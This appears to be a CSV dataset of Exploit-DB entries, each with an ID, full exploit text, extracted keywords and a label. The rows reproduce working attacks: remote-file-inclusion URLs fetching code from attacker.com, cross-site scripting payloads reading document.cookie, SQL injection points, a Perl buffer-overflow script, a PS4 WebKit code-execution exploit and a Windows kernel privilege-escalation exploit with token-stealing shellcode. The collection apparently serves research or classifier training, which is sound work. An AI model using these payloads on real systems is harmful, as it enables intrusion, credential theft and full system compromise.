""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE7\xD8\x48\xE0\x00\x00\x00\x00\x00\x00\x00\x00\x00\xF7\xF7\xF5"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x34\x75\xD8\x3D\x00\x00\x00\x00\x00\x00\x00\x00\x00\xF5\xF5\xF4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xD3\xAD\x90\xDD"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9E\x3E"". 	        ""\x43\xF9\x38\xAC\xE5\x6B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xCA\x65\x65\xC2\xAF\xE6\x00\x43\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xD6\xDE\x7C\x1C\x9C\x04\x36\xC6\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3D\x90\x90\xC1\xAD\x12\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00\x02\x03\x01"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	        ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	    ",,
,,0,
27829,Phil's Bookmark Script - 'admin.php' Authentication Bypass source: https://www.securityfocus.com/bid/17878/info  Phil's Bookmark script is prone to an authentication-bypass vulnerability. The issue occurs because the affected script fails to prompt for authentication credentials.   An attacker can exploit this issue to bypass authentication and gain admin access to the affected application. This could aid in further attacks on the affected computer.  http://www.example.com/bookmarks/admin.php?edit=1,"[""'admin.php'""]",1
2725,"Cyberfolio 2.0 RC1 - 'av' Remote File Inclusion ____________________   ___ ___ ________ \_   _____/\_   ___ \ /   |   \\_____  \  |    __)_ /    \  \//    ~    \/   |   \  |        \\     \___\    Y    /    |    \ /_______  / \______  /\___|_  /\_______  /         \/         \/       \/         \/                              .OR.ID ECHO_ADV_58$2006  ----------------------------------------------------------------------------------------------- [ECHO_ADV_58$2006]Cyberfolio <=2.0 RC1 $av  Remote File Inclusion Vulnerability -----------------------------------------------------------------------------------------------  Author		: Dedi Dwianto a.k.a the_day Date Found	: November, 01nd 2006 Location	: Indonesia, Jakarta web		: http://advisories.echo.or.id/adv/adv58-theday-2006.txt Critical Lvl	: Highly critical Impact		: System access Where		: From Remote ---------------------------------------------------------------------------  Affected software description: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Application	: Cyberfolio version		: <=2.0 RC1 URL		: http://www.cyberfolio.org  ---------------------------------------------------------------------------  Vulnerability: ~~~~~~~~~~~~~~  I found vulnerability in script view.php --------------------------view.php----------------------------------- .... <? ... $newfic=$av.""checkauth"".$_SESSION[inlog]."".php""; include(""$newfic""); include_once($av.""config.php""); include_once($av.""connect.php""); ... ----------------------------------------------------------  Input passed to the ""$av"" parameter in view.php is not properly verified before being used. This can be exploited to execute arbitrary PHP code by including files from local or external resources.  Also affected files :  portfolio/msg/view.php portfolio/msg/inc_message.php portfolio/msg/inc_envoi.php portfolio/admin/incl_voir_compet.php   Proof Of Concept: ~~~~~~~~~~~~~~~  http://target.com/cyberfolio/portfolio/msg/view.php?av=http://attacker.com/inject.txt? http://target.com/cyberfolio/portfolio/admin/incl_voir_compet.php?av=http://attacker.com/inject.txt?   Solution: ~~~~~~~  - Sanitize variable $av affected files. - Turn off register_globals  Timeline : ~~~~~~~~~  01 - 11 - 2006 bugs found 01 - 11 - 2006 vendor contacted 07 - 11 - 2006 public disclosure  ---------------------------------------------------------------------------  Shoutz: ~~~ ~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous ~ Jessy My Brain ~ az001,bomm_3x,matdhule,angelia ~ newbie_hacker@yahoogroups.com ~ #aikmel - #e-c-h-o @irc.dal.net ------------------------------------------------------------------------ --- Contact: ~~~~      EcHo Research & Development Center      the_day[at]echo[dot]or[dot]id       -------------------------------- [ EOF ]----------------------------------  # milw0rm.com [2006-11-06]","[""'av'"", '$av']",1
27306,JGS-Gallery 4.0 - 'jgs_galerie_slideshow.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/16810/info  JGS-Gallery is prone to multiple cross-site scripting vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/jgs_galerie_slideshow.php?sid=&katid=&userid=[XSS] http://www.example.com/jgs_galerie_slideshow.php?sid=&katid=[XSS]&userid=,"[""'jgs_galerie_slideshow.php'""]",1
30494,"Microsoft Internet Explorer 5.0.1 - Vector Markup Language 'VGX.dll' Remote Buffer Overflow source: https://www.securityfocus.com/bid/25310/info  Microsoft Internet Explorer is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.  This issue occurs when rendering VML (Vector Markup Language) graphics.  Attackers can leverage this issue to execute arbitrary code in the context of the currently logged-in user.  Successful attacks may facilitate the remote compromise of affected computers. Failed attacks will likely cause denial-of-service conditions.   To exploit this issue, an attacker must entice an unsuspecting user to view a malicious HTML document.  A VML document containing the following construct pointing to a malicious compressed image file will trigger this issue:  <v:rect> <v:imagedata src=""http://www.example.com/compressed.emz""> </v:rect>","[""'VGX.dll'""]",1
46522,"Sony Playstation 4 (PS4) < 6.20 - WebKit Code Execution (PoC) PS4 6.20 WebKit Code Execution PoC ==============  This repo contains a proof-of-concept (PoC) RCE exploit targeting the PlayStation 4 on firmware 6.20 leveraging CVE-2018-4441. The exploit first establishes an arbitrary read/write primitive as well as an arbitrary object address leak in `wkexploit.js`. It will then setup a framework to run ROP chains in `index.html` and by default will provide two hyperlinks to run test ROP chains - one for running the `sys_getpid()` syscall, and the other for running the `sys_getuid()` syscall to get the PID and user ID of the process respectively.  Each file contains a comment at the top giving a brief explanation of what the file contains and how the exploit works. Credit for the bug discovery is to lokihardt from Google Project Zero (p0). The bug report can be found [here](https://bugs.chromium.org/p/project-zero/issues/detail?id=1685&desc=2).  Note: It's been patched in the 6.50 firmware update.    Files ==============  Files in order by name alphabetically;  * `index.html` - Contains post-exploit code, going from arb. R/W -> code execution. * `rop.js` - Contains a framework for ROP chains. * `syscalls.js` - Contains an (incomplete) list of system calls to use for post-exploit stuff. * `wkexploit.js` - Contains the heart of the WebKit exploit.    Notes ==============  * This vulnerability was patched in 6.50 firmware! * This only gives you code execution in **userland**. This is **not** a jailbreak nor a kernel exploit, it is only the first half. * This exploit targets firmware 6.20. It should work on lower firmwares however the gadgets will need to be ported, and the `p.launchchain()` method for code execution may need to be swapped out. * In my tests the exploit as-is is pretty stable, but it can become less stable if you add a lot of objects and such into the exploit. This is part of the reason why `syscalls.js` contains only a small number of system calls.    Usage ==============  Setup a web-server hosting these files on localhost using xampp or any other program of your choosing. Additionally, you could host it on a server. You can access it on the PS4 by either;  1) Fake DNS spoofing to redirect the manual page to the exploit page, or  2) Using the web browser to navigate to the exploit page (not always possible).    Vulnerability Credit ==============  I wrote the exploit however I did not find the vulnerability, as mentioned above the bug (CVE-2018-4441) was found by lokihardt from Google Project Zero (p0) and was disclosed via the Chromium public bug tracker.    Resources ==============  [Chromium Bug Report](https://bugs.chromium.org/p/project-zero/issues/detail?id=1685&desc=2) - The vulnerability.  [Phrack: Attacking JavaScript Engines by saelo](http://www.phrack.org/papers/attacking_javascript_engines.html) - A life saver. Exploiting this would have been about 1500x more difficult without this divine paper.    Thanks ==============  lokihardt - The vulnerability  st4rk - Help with the exploit  qwertyoruiop - WebKit School  saelo - Phrack paper   Download: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46522.zip",['index.html`'],1
34501,"Hitron Soft Answer Me - 'answers.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/42558/info  Hitron Soft Answer Me is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Answer Me 1.0 is vulnerable; other versions may be affected.   http://www.example.com/answers?q_id=1>""><ScRiPt %0D%0A>alert(413587968783)%3B</ScRiPt>","[""'answers.php'""]",1
5718,"Alt-N SecurityGateway 1.0.1 - 'Username' Remote Buffer Overflow (PoC) ################################################################################################################## # SecurityGateway 1.0.1 Remote Buffer Overflow ( username) # Vendor: http://www.altn.com/ # risk : critical #SecurityGateway open port 4000 for remote administration/managment, EIP get owned  when the username field is filled with 720 chars # #eax=00000000 ebx=00000000 ecx=63636363 edx=7c9137d8 esi=00000000 edi=00000000 #eip=63636363 esp=042ce910 ebp=042ce930 iopl=0         nv up ei pl zr na pe nc #cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 #63636363 ??              ??? # # Replace http://127.0.0.1:4000/ with your remote host.  use LWP::UserAgent; $connect = LWP::UserAgent->new; my $payload1 =""a"" x 236; my $payload2 =""b"" x 480; my $eip_owned = ""c"" x 4;  print ""SecurityGateway Remote BoF exploit by securfrog.\n\n""; my $req = HTTP::Request->new(POST => 'http://127.0.0.1:4000/SecurityGateway.dll'); $req->content_type('application/x-www-form-urlencoded'); $req->content('RequestedPage=login&username='.$payload2.$eip_owned.$payload1.'&passwd=world&lang=en&logon=Sign+In'); my $res = $connect->request($req); print $res->as_string; print ""Exploit successfull\n"";  # milw0rm.com [2008-06-01]","[""'Username'""]",1
11678,PhpCityPortal - Multiple Vulnerabilities [?] ?????????????????????????{In The Name Of Allah The Mercifull}?????????????????????? [?] [~] Tybe: suffer from multi SQL !NJECTON Vulnerability [~] Vendor: phpcityportal.com [?] Software : PhpCityPortal [-] pR!CE : -PURCHASE 1 LICENSE - $149 each -PURCHASE 3 LICENSES - $119 each -PURCHASE 5 LICENSES - $99 each -PURCHASE 6 OR MORE LICENSES PLEASE CONTACT US FOR PRICING.  [?] author: ((R3d-D3v!L)) [?] TEAM: ArAB!AN !NFORMAT!ON SeCuR!TY [?] contact: N/A [-] [?] Date: 10.MAR.2010 [?] T!ME: 04:15 pm GMT [?] Home: WwW.xP10.ME [?] [?] [-]??????????????????????{DEV!L'5 of SYST3M}??????????????????  SQL Injection:  [*] Err0r C0N50L3:  http://TARGET/P47H/video_show.php?id=SQL  http://TARGET/P47H/spotlight_detail.php?id=SQL  http://TARGET/P47H/real_estate_details.php?id=sql  http://TARGET/P47H/auto_details.php?id=sql   [~] {EV!L EXPLO!T}:  [*]FORb!d3N   Remote File Inclusion:  [*] Err0r C0N50L3:  http://TARGET/P47H/external.php?url=include your fucken evil shell   [~] {EV!L EXPLO!T}:  like: http://server/external.php?url=http://xp10.me  N073:  REAL RED DEV!L W@S h3r3 LAMERZ   GAZA !N our hearts !   [~]-----------------------------{((MAGOUSH-87))}---------------------------------------   [~] Greetz tO: dolly & MERNA & 0r45hy & DEV!L_MODY & po!S!ON Sc0rp!0N & mAG0ush-1987  [~]70 ALL ARAB!AN HACKER 3X3PT : LAM3RZ  [~] spechial thanks : ab0 mohammed & XP_10 h4CK3R & JASM!N & c0prA & MARWA & N0RHAN & S4R4  [?]spechial SupP0RT: MY M!ND ;) & dookie2000ca &((OFFsec))  [?]4r48!4n.!nforma7!0N.53cur!7y ---> ((r3d D3v!L<--M2Z--->JUPA<---aNd--->Devil ro0t))  [~]spechial FR!ND: 74M3M  [~] !'M 4R48!4N 3XPL0!73R.  [~]{[(D!R 4ll 0R D!E)]};  [~]---------------------------------------------------------------------------------------------,['external.php?'],1
31801,"ACGV News 0.9.1 - 'glossaire.php?id' SQL Injection source: https://www.securityfocus.com/bid/29253/info  ACGV News is prone to multiple input-validation vulnerabilities, including an SQL-injection issue and a cross-site scripting issue, because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  ACGV News 0.9.1 is vulnerable; other versions may also be affected.   http://www.example.com/ACGVnews/glossaire.php?id=[SQL]","[""'glossaire.php?id'""]",1
35277,"WebsiteBaker 2.8.3 - Multiple Vulnerabilities ============================================= MGC ALERT 2014-004 - Original release date: March 11, 2014 - Last revised:  November 18, 2014 - Discovered by: Manuel Garcia Cardenas - Severity: 10/10 (CVSS Base Score) =============================================  I. VULNERABILITY ------------------------- Multiple Vulnerabilities in WebsiteBaker 2.8.3  II. BACKGROUND ------------------------- WebsiteBaker helps you to create the website you want: A free, easy and secure, flexible and extensible open source content management system (CMS).  III. DESCRIPTION ------------------------- It is possible to inject SQL code in the variable ""id"" on the page ""modify.php"". This bug was found using the portal without authentication. To exploit the vulnerability only is needed use the version 1.0 of the HTTP protocol to interact with the application. Has been detected a reflected XSS vulnerability in WebsiteBaker, that allows the execution of arbitrary HTML/script code to be executed in the context of the victim user's browser. An input validation problem exists within WebsiteBaker which allows injecting CR (carriage return - %0D or \r) and LF (line feed - %0A or \n) characters into the server HTTP response header, resulting in a HTTP Response Splitting Vulnerability.  IV. PROOF OF CONCEPT ------------------------- SQL Injection:  /wb/admin/pages/modify.php?page_id=1  Cross-Site Scripting GET:  /wb/admin/admintools/tool.php?tool=captcha_control&6d442""><script>alert(1)</script>8e3b12642a8=1 /wb/modules/edit_module_files.php?page_id=1&mod_dir=news&edit_file=frontend.css&action=edit&page_id=1&section_id=%007e393<script>alert(1)</script>9f8a40a7355f9acf0 /wb/modules/news/add_post.php?page_id=1&section_id=f953a""><script>alert(1)</script>4ddf3369c1f /wb/modules/news/modify_group.php?page_id=1&section_id=%008cf03""><script>alert(1)</script>2680504c3ec&group_id=62be99873b33d1d3 /wb/modules/news/modify_post.php?page_id=1&section_id=%003874a<script>alert(1)</script>4194d511605&post_id=db89943875a2db52 /wb/modules/news/modify_settings.php?page_id=1&section_id=%008b2f4""><script>alert(1)</script>bdc8b3919b5  HTTP RESPONSE SPLITTING:  If you enter a valid user and password, you can inject on the headers malicious code, example.  POST /wb/admin/login/index.php HTTP/1.1 Content-Length: 204 Content-Type: application/x-www-form-urlencoded Referer: http://192.168.244.129:80/wb/ Host: 127.0.0.1 Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36 Accept: */*  password_fieldname=password_nwh1uuwb&password_nwh1uuwb=VALIDPASS&remember=true&submit=Entrar& url=%0d%0a%20InjectedHeader:MaliciousCode&username_fieldname=username_nwh1uuwb&username_nwh1uuwb=adminResponse  You can inject a new header named: InjectedHeader:MaliciousCode because we inject a CR&LF new line with %0d%0a%20.  V. BUSINESS IMPACT ------------------------- Public defacement, confidential data leakage, and database server compromise can result from these attacks. Client systems can also be targeted, and complete compromise of these client systems is also possible.  VI. SYSTEMS AFFECTED ------------------------- WebsiteBaker <= 2.8.3  VII. SOLUTION ------------------------- No news releases  VIII. REFERENCES ------------------------- http://www.websitebaker.org  IX. CREDITS ------------------------- This vulnerability has been discovered and reported by Manuel Garcia Cardenas (advidsec (at) gmail (dot) com).  X. REVISION HISTORY ------------------------- March 11, 2014 1: Initial release  XI. DISCLOSURE TIMELINE ------------------------- March 11, 2014 1: Vulnerability acquired by Manuel Garcia Cardenas March 11, 2014 2: Send to vendor June 05, 2014 3: Second mail to the verdor without response November 18, 2014 4: Sent to lists  XII. LEGAL NOTICES ------------------------- The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.  XIII. ABOUT ------------------------- Manuel Garcia Cardenas Pentester","['modify.php""']",1
43192,"Microsoft Windows 10 (Build 1703 Creators Update) (x86) - 'WARBIRD' 'NtQuerySystemInformation ' Kernel Local Privilege Escalation /*    EDB Note   Source ~ https://gist.github.com/xpn/736daa4d1ff7b9869f4b3d1e9a34d315/ff2e2465d4a07588d0148dc87e77b17b41ef9d1d   Source ~ https://blog.xpnsec.com/windows-warbird-privesc/   Source ~ https://github.com/xpn/warbird_exploit   Ref ~ https://bugs.chromium.org/p/project-zero/issues/detail?id=1391 */      // Shellcode to be executed by exploit     const char shellcode[256] = { 	0xc7, 0x43, 0x04, 0x00, 0x00, 0x00, 0x00, 0x81, 0xc4, 0x0c, 	0x00, 0x00, 0x00, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x5f, 	0x5e, 0x5b, 0x89, 0xec, 0x5d, 0x81, 0xc4, 0x0c, 0x00, 0x00, 	0x00, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x5e, 0x5b, 0x5f, 	0x89, 0xec, 0x5d, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x81, 	0xc4, 0x04, 0x00, 0x00, 0x00, 0x5f, 0x5e, 0x5b, 0x89, 0xec, 	0x5d, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x81, 0xc4, 0x04, 	0x00, 0x00, 0x00, 0x5f, 0x5f, 0x5e, 0x5b, 0x89, 0xec, 0x5d, 	0x60, 0x64, 0xa1, 0x24, 0x01, 0x00, 0x00, 0xc7, 0x80, 0x3e, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xe8, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xec, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xf0, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xf4, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xf8, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xfc, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x50, 	0x01, 0x00, 0x00, 0x81, 0xb8, 0x7c, 0x01, 0x00, 0x00, 0x63, 	0x6d, 0x64, 0x2e, 0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00, 	0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00, 0xeb, 0xe7, 0x89, 0xc3, 	0x81, 0xb8, 0xb4, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 	0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x2d, 0xb8, 	0x00, 0x00, 0x00, 0xeb, 0xe7, 0x8b, 0x88, 0xfc, 0x00, 0x00, 	0x00, 0x89, 0x8b, 0xfc, 0x00, 0x00, 0x00, 0x61, 0xc3, 0xff, 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff     };  void exploit(void) { 	BYTE Buffer[8]; 	DWORD BytesReturned;      	RtlZeroMemory(Buffer, sizeof(Buffer)); 	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned);      	// Copy our shellcode to the NULL page 	RtlCopyMemory(NULL, shellcode, 256);      	RtlZeroMemory(Buffer, sizeof(Buffer)); 	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned); }  BOOL APIENTRY DllMain( HMODULE hModule,                        DWORD  ul_reason_for_call,                        LPVOID lpReserved 					             ) { 	switch (ul_reason_for_call) 	{ 	case DLL_PROCESS_ATTACH: 	case DLL_THREAD_ATTACH: 	case DLL_THREAD_DETACH: 	case DLL_PROCESS_DETACH: 		exploit(); 		break; 	} 	return TRUE; }","[""'WARBIRD'"", ""'NtQuerySystemInformation '""]",1
31411,"RSA WebID 5.3 - 'IISWebAgentIF.dll' Cross-Site Scripting source: https://www.securityfocus.com/bid/28277/info  RSA WebID is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  RSA WebID 5.3 is vulnerable; other versions may also be affected.   https://www.example.com/WebID/IISWebAgentIF.dll?stage=useridandpasscode&referrer=Z2F&sessionid=0&authntype=2&username=a&passcode=a&postdata=aaa""%20><SCRIPT>alert(document.cookie)</script><!--","[""'IISWebAgentIF.dll'""]",1
5112,"jspwiki 2.4.104/2.5.139 - Multiple Vulnerabilities JSPWiki Multiple Vulnerabilities   Vendor: Janne Jalkanen JSPWiki â€“ http://www.jspwiki.org  Application Description: From JSPWiki website - â€œJSPWiki is a feature-rich and extensible WikiWiki engine built around a standart J2EE components (Java, servlets, JSP).â€  Tested versions: JSPWiki v2.4.104 JSPWiki v2.5.139 Earlier versions may also be affected.  JSPWiki Local .jsp File Inclusion Vulnerability. An input validation problem exists within JSPWiki which allows to execute (include) arbitrary local .jsp files. An attacker may leverage this issue to execute arbitrary server-side script code on a vulnerable server with the privileges of the web server process.  Example (including rss.jsp file from the application root directory): http://server/JSPWikiPath/Edit.jsp?page=Main&editor=../../../rss  Note: page parameter must be an existing page on the server.  This grants an attacker unauthorized access to sensitive .jsp files on the server and can lead to information disclosure.  Examples: http://server/JSPWikiPath/Edit.jsp?page=User&editor=../../../Install http://server/JSPWikiPath/Edit.jsp?page=User&editor=../../../admin/SecurityConfig  The first example disclose sensitive information such as the full path of the application on the server, page (and attachments) storage path, log files and work directory by including the application installation (Install.jsp). The second example disclose the application security configurations by including the JSPWiki Security Configuration Verifier file (admin/SecurityConfig.jsp).  In addition, JSPWiki allow users to upload (attach) files to entry pages. An attacker can use the information disclosed by the installation file to upload a malicious .jsp file and locally execute it. By executing malicious server-side code, an attacker may be able to compromise the server.   JSPWiki Cross-Site Scripting Vulnerability. An attacker may leverage cross-site scripting vulnerability to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  Example: http://server/JSPWikiPath/Edit.jsp?page=Main&editor=%3Cscript%3Ealert(document.cookie)%3C/script%3E  Original Document: http://www.bugsec.com/articles.php?Security=48&Web-Application-Firewall=0  Download PDF: http://www.bugsec.com/up_files/JSPWiki_Multiple_Vulnerabilities.pdf  Credit: Moshe BA BugSec LTD. - Security Consulting Company Tel: +972-3-9622655 Fax: +972-3-9511433 Email: Info -at- BugSec -d0t- com http://www.bugsec.com   # milw0rm.com [2008-02-13]",['rss.jsp'],1
